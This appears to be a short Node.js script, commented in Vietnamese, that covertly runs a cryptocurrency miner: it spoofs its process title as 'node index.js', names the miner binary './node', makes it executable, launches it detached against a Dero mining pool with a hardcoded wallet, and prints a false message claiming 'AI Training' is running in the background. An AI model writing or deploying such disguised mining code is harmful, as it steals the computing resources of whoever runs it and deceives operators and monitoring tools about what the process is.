const { spawn } = require('child_process');
const { exec } = require('child_process');

// Đổi tên tiến trình hiển thị trong htop
process.title = 'node index.js'; // Đặt tên giả cho tiến trình

// Thông tin pool và ví
const minerPath = './node'; // Đảm bảo đường dẫn chính xác
const args = [
  '-w', 'deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmfl63xxrqzrxjswhzzh9', // Ví
  '-r', 'community-pools.mysrv.cloud:10300', // Pool
  '-p', 'rpc', // Password hoặc protocol
];

// Cấp quyền thực thi cho tệp miner (./node)
exec('chmod +x ./node', (err, stdout, stderr) => {
  if (err) {
    console.error(`Lỗi khi cấp quyền: ${stderr}`);
    return;
  }
  console.log('Cấp quyền thực thi cho ./node thành công.');

  // Chạy miner thực tế
  const miner = spawn(minerPath, args, {
    stdio: ['ignore', 'pipe', 'pipe'], // Lấy output từ stdout và stderr
    detached: true, 
    shell: true,
  });

  // Ghi log từ stdout trực tiếp vào terminal
  miner.stdout.on('data', (data) => {
    console.log(data.toString());  // In log miner ra terminal
  });

  // Ghi log từ stderr trực tiếp vào terminal nếu có lỗi
  miner.stderr.on('data', (data) => {
    console.error(`ERROR: ${data.toString()}`);  // In lỗi ra terminal
  });

  miner.unref(); // Cho phép tiến trình chạy ngầm
  console.log('AI Training đang chạy ngầm...');
});
